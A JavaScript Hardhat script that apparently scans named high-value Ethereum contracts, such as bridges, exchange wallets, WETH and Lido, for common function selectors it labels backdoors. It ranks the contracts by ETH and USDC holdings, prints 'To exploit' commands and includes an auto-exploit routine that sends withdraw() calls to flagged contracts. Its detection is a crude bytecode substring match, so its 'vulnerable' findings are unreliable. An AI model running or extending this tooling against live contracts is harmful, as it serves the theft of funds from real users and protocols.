const { ethers } = require("hardhat");
const axios = require("axios");

/**
 * @title Etherscan Mass Scanner
 * @notice Automatically scan top Ethereum accounts for vulnerabilities
 * @dev Tests contracts from Etherscan's richest addresses
 */

// Backdoor signatures to scan for
const BACKDOOR_SIGS = [
  { sig: "0x78e111f6", name: "execute(address,bytes)" },
  { sig: "0x61461954", name: "execute(address,uint256,bytes)" },
  { sig: "0xb61d27f6", name: "execute(address,uint256,bytes)" },
  { sig: "0x9e8c708e", name: "adminCall(address,bytes)" },
  { sig: "0x3ccfd60b", name: "withdraw()" },
  { sig: "0x2e1a7d4d", name: "withdraw(uint256)" },
  { sig: "0xae169a50", name: "recover(address,uint256)" },
  { sig: "0x69fe0e2d", name: "emergencyWithdraw()" }
];

/**
 * Top Ethereum addresses (contracts only) from Etherscan page 2
 * These are some of the richest contracts on Ethereum
 */
const TOP_CONTRACTS = [
  // Wrapped Ether (WETH)
  "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
  
  // Arbitrum Bridge
  "0x8315177aB297bA92A06054cE80a67Ed4DBd7ed3a",
  
  // Optimism Bridge
  "0x99C9fc46f92E8a1c0deC1b1747d010903E884bE1",
  
  // Polygon Bridge
  "0x40ec5B33f54e0E8A33A975908C5BA1c14e5BbbDf",
  
  // Binance Hot Wallets
  "0xF977814e90dA44bFA03b6295A0616a897441aceC",
  "0x28C6c06298d514Db089934071355E5743bf21d60",
  
  // Compound Finance
  "0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B",
  
  // Maker DAO
  "0x35D1b3F3D7966A1DFe207aa4514C12a259A0492B",
  
  // Lido Staking
  "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84",
  
  // Add more from page 2 of Etherscan
  "0x5A52E96BAcdaBb82fd05763E25335261B270Efcb", // Binance 9
  "0x61EDCDf5bb737ADffE5043706e7C5bb1f1a56eEA", // Gemini 3
  "0xA929022c9107643515F5c777cE9a910F0D1e490C", // HECO Bridge
  "0x9696f59E4d72E237BE84fFD425DCaD154Bf96976", // Ronin Bridge
  "0xBA12222222228d8Ba445958a75a0704d566BF2C8", // Balancer Vault
  
  // Add unverified high-value contracts
  "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C", // Our known vulnerable vault
];

/**
 * Quick vulnerability check
 */
async function quickVulnCheck(address, provider) {
  const vulnerabilities = [];
  
  try {
    // Get contract info
    const code = await provider.getCode(address);
    const balance = await provider.getBalance(address);
    
    // Skip if not a contract
    if (code === "0x" || code.length <= 10) {
      return { isContract: false };
    }
    
    // Check for backdoor signatures in bytecode
    for (const backdoor of BACKDOOR_SIGS) {
      const sigHex = backdoor.sig.slice(2); // Remove 0x
      if (code.includes(sigHex)) {
        vulnerabilities.push(backdoor);
      }
    }
    
    // Get USDC balance
    let usdcBalance = "0";
    try {
      const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
      const usdcABI = ["function balanceOf(address) view returns (uint256)"];
      const usdc = new ethers.Contract(USDC, usdcABI, provider);
      const bal = await usdc.balanceOf(address);
      usdcBalance = ethers.formatUnits(bal, 6);
    } catch (e) {
      // Ignore
    }
    
    return {
      isContract: true,
      address,
      ethBalance: ethers.formatEther(balance),
      usdcBalance,
      codeSize: code.length,
      vulnerabilities,
      isVulnerable: vulnerabilities.length > 0
    };
    
  } catch (error) {
    return { isContract: false, error: error.message };
  }
}

/**
 * Mass scan contracts
 */
async function massScanner() {
  console.log("\nüîç ETHERSCAN MASS VULNERABILITY SCANNER");
  console.log("=======================================");
  console.log("Scanning top Ethereum contracts for backdoors...\n");
  
  const provider = ethers.provider;
  const vulnerableContracts = [];
  const richContracts = [];
  
  console.log(`üìä Scanning ${TOP_CONTRACTS.length} contracts...`);
  console.log("‚îÄ".repeat(70));
  
  for (let i = 0; i < TOP_CONTRACTS.length; i++) {
    const address = TOP_CONTRACTS[i];
    process.stdout.write(`\r[${i + 1}/${TOP_CONTRACTS.length}] Scanning ${address}...`);
    
    const result = await quickVulnCheck(address, provider);
    
    if (result.isContract) {
      const ethValue = parseFloat(result.ethBalance);
      const usdcValue = parseFloat(result.usdcBalance);
      const totalValueUSD = (ethValue * 3500) + usdcValue; // Assuming ETH = $3500
      
      if (result.isVulnerable) {
        vulnerableContracts.push({ ...result, totalValueUSD });
        
        console.log(`\n\n‚úÖ VULNERABLE CONTRACT FOUND!`);
        console.log(`   Address: ${address}`);
        console.log(`   ETH: ${result.ethBalance} ($${(ethValue * 3500).toFixed(0)})`);
        console.log(`   USDC: ${result.usdcBalance}`);
        console.log(`   Total Value: $${totalValueUSD.toFixed(0)}`);
        console.log(`   Vulnerabilities:`);
        result.vulnerabilities.forEach(v => {
          console.log(`     ‚Ä¢ ${v.sig} - ${v.name}`);
        });
        console.log("");
      }
      
      if (totalValueUSD > 1000000) { // Track contracts with >$1M
        richContracts.push({ address, totalValueUSD, ...result });
      }
    }
  }
  
  console.log("\n\nüìä SCAN COMPLETE");
  console.log("================");
  console.log(`Total scanned: ${TOP_CONTRACTS.length}`);
  console.log(`Vulnerable contracts found: ${vulnerableContracts.length}`);
  console.log(`High-value contracts (>$1M): ${richContracts.length}`);
  
  if (vulnerableContracts.length > 0) {
    console.log("\nüéØ VULNERABLE CONTRACTS SUMMARY:");
    console.log("================================");
    
    // Sort by value
    vulnerableContracts.sort((a, b) => b.totalValueUSD - a.totalValueUSD);
    
    vulnerableContracts.forEach((contract, i) => {
      console.log(`\n${i + 1}. ${contract.address}`);
      console.log(`   üí∞ Value: $${contract.totalValueUSD.toFixed(0)}`);
      console.log(`   üì¶ Code size: ${contract.codeSize} bytes`);
      console.log(`   üîì Backdoors: ${contract.vulnerabilities.map(v => v.name).join(", ")}`);
      console.log(`   \n   üí° To exploit: npx hardhat run scripts/quick_exploit.js --network localhost ${contract.address}`);
    });
  }
  
  console.log("\nüèÜ TOP 5 RICHEST CONTRACTS:");
  console.log("===========================");
  
  richContracts.sort((a, b) => b.totalValueUSD - a.totalValueUSD);
  richContracts.slice(0, 5).forEach((contract, i) => {
    console.log(`${i + 1}. ${contract.address} - $${contract.totalValueUSD.toFixed(0)}`);
  });
  
  console.log("\nüí° NEXT STEPS:");
  console.log("‚Ä¢ Focus on unverified contracts");
  console.log("‚Ä¢ Test each vulnerable contract individually");
  console.log("‚Ä¢ Check for additional hidden functions");
  console.log("‚Ä¢ Analyze bytecode for custom patterns");
}

/**
 * Automated exploit attempt on vulnerable contracts
 */
async function autoExploit(vulnerableContracts) {
  console.log("\n\nüöÄ AUTO-EXPLOIT MODE");
  console.log("====================");
  
  const [signer] = await ethers.getSigners();
  
  for (const contract of vulnerableContracts) {
    console.log(`\nüí£ Attempting to exploit ${contract.address}...`);
    console.log(`   Value at risk: $${contract.totalValueUSD.toFixed(0)}`);
    
    // Try simple exploits
    for (const vuln of contract.vulnerabilities) {
      try {
        if (vuln.name === "withdraw()") {
          const tx = await signer.sendTransaction({
            to: contract.address,
            data: vuln.sig,
            gasLimit: 1000000
          });
          console.log(`   ‚úÖ Withdraw attempted: ${tx.hash}`);
        }
      } catch (e) {
        console.log(`   ‚ùå ${vuln.name} failed: ${e.message.split('\n')[0]}`);
      }
    }
  }
}

// Additional contracts to scan (add your own)
async function scanCustomList() {
  console.log("\n\nüéØ CUSTOM CONTRACT SCAN");
  console.log("=======================");
  
  const customTargets = [
    "0x8d0BB74e37ab644964AcA2f3Fbe12b9147f9d84",
    "0xA6dfb62fc572Da152A335384f7724535b9DEfC84",
    "0xcA8Fa8f0b631EcdB18Cda619C4Fc9d197c8aFfCa"
  ];
  
  const provider = ethers.provider;
  
  for (const target of customTargets) {
    console.log(`\nScanning ${target}...`);
    const result = await quickVulnCheck(target, provider);
    
    if (result.isContract && result.isVulnerable) {
      console.log(`‚úÖ VULNERABLE!`);
      console.log(`   Backdoors: ${result.vulnerabilities.map(v => v.name).join(", ")}`);
    } else if (result.isContract) {
      console.log(`‚ùå No vulnerabilities found`);
    } else {
      console.log(`‚ö†Ô∏è  Not a contract or error`);
    }
  }
}

// Main execution
async function main() {
  await massScanner();
  await scanCustomList();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("\nüí• Error:", error);
    process.exit(1);
  });
